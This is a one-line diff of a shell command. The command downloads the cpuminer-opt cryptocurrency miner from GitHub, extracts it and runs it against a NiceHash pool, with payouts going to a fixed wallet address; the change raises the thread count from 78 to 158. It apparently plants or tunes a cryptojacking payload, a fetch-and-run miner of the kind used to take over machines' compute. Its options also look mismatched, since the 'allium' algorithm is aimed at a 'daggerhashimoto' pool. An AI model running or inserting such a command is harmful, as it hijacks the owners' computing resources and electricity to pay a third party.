@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u NHbNxMYewM7QJQMyKiGFb54dNRs7GBHXEapu -p c=BTC -t 78
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u NHbNxMYewM7QJQMyKiGFb54dNRs7GBHXEapu -p c=BTC -t 158
